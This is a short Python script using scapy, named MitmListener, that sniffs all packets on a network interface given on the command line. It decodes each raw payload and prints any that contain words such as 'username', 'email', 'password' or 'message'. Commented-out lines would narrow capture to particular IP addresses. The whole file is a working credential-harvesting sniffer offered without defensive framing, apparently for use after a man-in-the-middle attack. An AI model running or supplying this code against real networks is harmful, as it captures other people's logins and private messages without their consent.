from scapy.all import sniff
# from scapy.all import scapy, sniff
# from scapy.layers.http import HTTPRequest
from sys import argv

class MitmListener:
    def __init__(self, interface):
        self.target_words = ["username", "user", "email", "e-mail", "name", "firstname", "lastname", "password", "pass", "message", "text"]
        self.network_interface = interface

    def package_analyzer(self, package):
        try:
            if package.haslayer("Raw"):
                decoded_package = package["Raw"].load.decode("utf-8")
                for word in self.target_words:
                    if word in decoded_package:
                        print(decoded_package)
                        break
        except Exception:
            pass

    def listener(self):
        print("\nListening...")
        # filter1 = "162.241.225.48"
        # filter2 = "44.228.249.3"
        # filter3 = "163.182.194.25"
        # filter4 = "127.0.0.1"
        # filtered_website = f"ip host {filter2}"
        # sniff(iface=self.network_interface, store=False, prn=self.package_analyzer, filter=filtered_website)
        sniff(iface=self.network_interface, store=False, prn=self.package_analyzer)


if __name__ == "__main__":
    mitm_listener = MitmListener(str(argv[1]))
    mitm_listener.listener()